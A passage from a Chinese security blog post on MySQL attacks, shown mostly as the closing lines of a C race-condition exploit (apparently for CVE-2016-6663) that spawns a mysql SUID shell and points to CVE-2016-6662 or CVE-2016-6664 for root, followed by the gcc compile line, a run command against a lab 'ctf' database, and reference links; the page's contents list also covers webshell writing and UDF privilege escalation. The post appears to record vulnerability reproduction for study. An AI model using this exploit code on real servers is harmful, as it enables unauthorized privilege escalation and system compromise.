punctuation">(</span><span class="token string">"\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n"</span><span class="token punctuation">,</span> cnt<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="227"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls -l "</span> SUID_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="228"></td><td><pre></pre></td></tr><tr><td data-num="229"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="230"></td><td><pre>    <span class="token function">system</span><span class="token punctuation">(</span>SUID_SHELL <span class="token string">" -p -i "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="231"></td><td><pre>    <span class="token comment">//system(SUID_SHELL " -p -c '/bin/bash -i -p'");</span></pre></td></tr><tr><td data-num="232"></td><td><pre></pre></td></tr><tr><td data-num="233"></td><td><pre>    <span class="token comment">/* close MySQL connection and exit */</span></pre></td></tr><tr><td data-num="234"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+] Job done. Exiting\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="235"></td><td><pre>    <span class="token function">mysql_close</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="236"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="237"></td><td><pre></pre></td></tr><tr><td data-num="238"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>通过下面的命令将其编译</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>gcc mysql-privesc-race.c <span class="token parameter variable">-o</span> mysql-privesc-race -I/usr/include/mysql <span class="token parameter variable">-lmysqlclient</span></pre></td></tr></table></figure><p>最后，在 shell 环境中执行的 exp 程序：</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./mysql-privesc-race ctf <span class="token number">123456</span> localhost ctf_table</pre></td></tr></table></figure><div class="note info"><p>这里只做记录</p><p>参考链接：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODQ1NTc=">https://www.anquanke.com/post/id/84557</span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODQ1NTQ=">https://www.anquanke.com/post/id/84554</span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTkyL2FydGljbGUvZGV0YWlscy84NDg2MzI2OA==">https://blog.csdn.net/qq_36119192/article/details/84863268</span></li><li><span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQ2Lw==">https://paper.seebug.org/46/</span></li><li><span class="exturl" data-url="aHR0cHM6Ly9kZXYubXlzcWwuY29tL2RvYy9yZWZtYW4vNS43L2VuL29wdGlvbi1maWxlcy5odG1s">https://dev.mysql.com/doc/refman/5.7/en/option-files.html</span></li></ul></div></div></div></div></div></div></div><div class="tags"><a href="/tags/Mysql/" rel="tag"><i class="ic i-tag"></i> Mysql</a></div></div><footer><div class="meta"><span id="2024/01/31/服务攻防/数据库安全-Mysql数据库/" class="item leancloud_visitors" data-flag-title="Mysql数据库安全" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2024/01/31/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/" title="Mysql数据库安全">https://blog.xcu.icu/2024/01/31/服务攻防/数据库安全-Mysql数据库/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/01/31/Vulnhub/VulnHub-DC%E7%AF%87DC-7/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;4.jpg" title="DC-7"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Vulnhub</span><h3>DC-7</h3></a></div><div class="item right"><a href="/2024/02/18/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis%E6%95%B0%E6%8D%AE%E5%BA%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;152.jpg" title="Redis数据库安全"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 服务攻防</span><h3>Redis数据库安全</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.</span> <span class="toc-text">Mysql 是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">mysql 的一些利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell"><span class="toc-number">4.1.</span> <span class="toc-text">webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#into-outfile"><span class="toc-number">4.1.1.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#general_log"><span class="toc-number">4.1.2.</span> <span class="toc-text">general_log</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.</span> <span class="toc-text">UDF 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#udf-shell"><span class="toc-number">4.2.1.</span> <span class="toc-text">udf shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2012-2122"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2012-2122</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2016-6662"><span class="toc-number">5.2.</span> <span class="toc-text">CVE-2016-6662</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="toc-number">5.2.1.</span> <span class="toc-text">攻击演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql_root%E6%9D%83%E9%99%90"><span class="toc-number">5.2.2.</span> <span class="toc-text">mysql_root 权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql_%E6%99%AE%E9%80%9A%E6%9D%83%E9%99%90"><span class="toc-number">5.2.3.</span> <span class="toc-text">mysql_普通权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">5.3.</span> <span class="toc-text">拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2016-6663"><span class="toc-number">5.3.1.</span> <span class="toc-text">CVE-2016-6663</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2024/01/31/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="bookmark" title="Mysql数据库安全">Mysql数据库安全</a></li><li><a href="/2024/02/18/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="bookmark" title="Redis数据库安全">Redis数据库安全</a></li><li><a href="/2024/03/04/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-IIS/" rel="bookmark" title="IIS漏洞复现">IIS漏洞复现</a></li><li><a href="/2024/03/07/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-Apache/" rel="bookmark" title="Apache漏洞复现">Apache漏洞复现</a></li><li><a href="/2024/03/19/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-nginx/" rel="bookmark" title="Nginx漏洞复现">Nginx漏洞复现</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">105</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">17</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">59</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2024/01/31/Vulnhub/VulnHub-DC%E7%AF%87DC-7/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2024/02/18/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/InternalNet/" title="分类于 内网">内网</a></div><span><a href="/2024/03/12/InternalNet/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E4%BA%8C%E6%AC%A1%E9%9D%B6%E6%9C%BA/" title="红日靶机2">红日靶机2</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/wp/" title="分类于 WP">WP</a></div><span><a href="/2023/08/17/wp/VNCTF2021/" title="VNCTF2021">VNCTF2021</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/10/28/java%E5%AE%89%E5%85%A8/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Jackson漏洞分析">Jackson漏洞分析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/database/" title="分类于 数据库">数据库</a></div><span><a href="/2023/01/05/database/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/" title="数据库设计">数据库设计</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/JavaJVM/" title="分类于 JavaJVM">JavaJVM</a></div><span><a href="/2023/09/10/JavaJVM/%E7%B1%BB%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="虐心短片之类文件结构">虐心短片之类文件结构</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/29/web/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="XSS跨站脚本攻击">XSS跨站脚本攻击</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/24/web/awd-web%E5%B0%8F%E7%BB%93/" title="Awd-web小结">Awd-web小结</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/05/web/phpfilter%E7%9A%84%E7%BB%95exit/" title="php:&#x2F;&#x2F;filter过exit">php://filter过exit</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/wp/" title="分类于 WP">WP</a></div><span><a href="/2023/11/04/wp/%E6%A5%BC%E4%B8%8A%E8%AF%B7%E8%AE%A9%E8%B7%AF/" title="第三届“鹏程杯”（初赛）">第三届“鹏程杯”（初赛）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/08/09/java%E5%AE%89%E5%85%A8/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞">Shiro反序列化漏洞</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="timing"><span id="RunTime"></span><script>var BootDate = new Date("2022/9/23 23:00:00"); &#123;# 站点起始时间 #&#125;
    function ShowRunTime(id) {
      var NowDate = new Date();
      var RunDateM = parseInt(NowDate - BootDate);
      var RunDays = Math.floor(RunDateM/(24*3600*1000));
      var RunHours = Math.floor(RunDateM%(24*3600*1000)/(3600*1000));
      var RunMinutes = Math.floor(RunDateM%(24*3600*1000)%(3600*1000)/(60*1000));
      var RunSeconds = Math.round(RunDateM%(24*3600*1000)%(3600*1000)%(60*1000)/1000);
      var RunTime = RunDays + " &#123;&#123; __('footer.days') &#125;&#125; " + RunHours + " &#123;&#123; __('footer.hours') &#125;&#125; " + RunMinutes + " &#123;&#123; __('footer.minutes') &#125;&#125; " + RunSeconds + " &#123;&#123; __('footer.seconds') &#125;&#125;";
      document.getElementById(id).innerHTML = "&#123;&#123; __('footer.timing') &#125;&#125; " + RunTime;
    }
    setInterval("ShowRunTime('RunTime')", 1000);</script></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">1m 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">42:04</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2024/01/31/服务攻防/数据库安全-Mysql数据库/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->